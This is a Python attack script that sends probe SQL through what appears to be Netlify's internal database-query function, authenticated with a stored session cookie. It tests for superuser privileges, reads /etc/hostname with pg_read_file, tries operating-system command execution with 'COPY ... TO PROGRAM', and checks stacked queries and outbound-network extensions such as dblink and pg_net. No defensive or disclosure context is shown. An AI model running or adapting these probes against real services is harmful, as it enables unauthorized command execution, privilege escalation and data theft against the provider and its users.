# -*- coding: utf-8 -*-
"""Netlify database-query 单点攻破探针:wrapper 过滤真相 + owner 权限边界(假设检验,非枚举)
A: owner 角色位 / B: pg_read_file / C: COPY PROGRAM / D: DO 块 / E: 多语句基准 / F: 出网扩展存在性
"""
import http.client, ssl, gzip, brotli, json, sys
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_NET

SITE_ID = '04f08ff6-f274-47ac-b6d7-5fb1e055f3b4'
ctx = ssl.create_default_context()


def req(path, method='POST', body=None):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=30)
    h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0',
         'Accept-Encoding': 'br, gzip', 'Accept': 'application/json', 'Cookie': COOKIE_NET}
    if body is not None:
        h['Content-Type'] = 'application/json'
        body = json.dumps(body).encode()
    conn.request(method, path, body=body, headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    conn.close()
    return st, raw


P = '/.netlify/functions/database-query'
probes = [
    ('A_role_flags', "select rolsuper, rolcreaterole, rolcreatedb, rolreplication, rolbypassrls from pg_roles where rolname = current_user"),
    ('B_pg_read_file', "select pg_read_file('/etc/hostname')"),
    ('C_copy_program', "copy (select 'x') to program 'id'"),
    ('D_do_block', "do $$ begin execute 'select 1'; end $$"),
    ('E_multi_stmt', "select 1; select 2"),
    ('F_ext_present', "select name, default_version, installed_version from pg_available_extensions where name in ('pg_net','neon_http','dblink','postgres_fdw','lo')"),
    ('G_version', "select version()"),
]
for label, sql in probes:
    try:
        s, raw = req(P, body={'siteId': SITE_ID, 'action': 'query', 'sql': sql})
        body = raw[:400].decode('utf-8', 'ignore').replace('\n', ' ')
        print('%-18s [%d] %s' % (label, s, body))
    except Exception as e:
        print('%-18s ERR %s' % (label, str(e)[:80]))
